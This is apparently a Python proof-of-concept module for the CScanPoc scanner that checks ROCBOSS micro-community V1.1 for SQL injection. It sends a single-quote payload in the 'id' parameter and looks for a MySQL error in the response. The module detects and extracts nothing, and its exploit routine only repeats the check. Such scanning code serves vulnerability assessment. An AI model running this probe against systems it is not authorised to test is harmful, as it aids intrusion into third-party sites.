# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'ROCBOSS_0001'  # 平台漏洞编号，留空
    name = 'ROCBOSS微社区V1.1版本SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-12-13'  # 漏洞公布时间
    desc = '''
        ROCBOSS微社区是一个高负荷，简单的微型社区软件。
        漏洞文件：\module\\user.module.class.php，第11行代码：
        当$_GET[‘id’]被赋值的时候这个参数就能控制了，而且没有进行过滤。
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/2634/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'ROCBOSS微社区'  # 漏洞应用名称
    product_version = 'V1.1'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'b8d8fed5-60ef-4c8e-9219-0fdc123fa53e'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-21'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = "/rocboss/?m=user&w=index&id=1'"
            url = self.target + payload
            r = requests.get(url)

            if 'MySQL Query Error' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
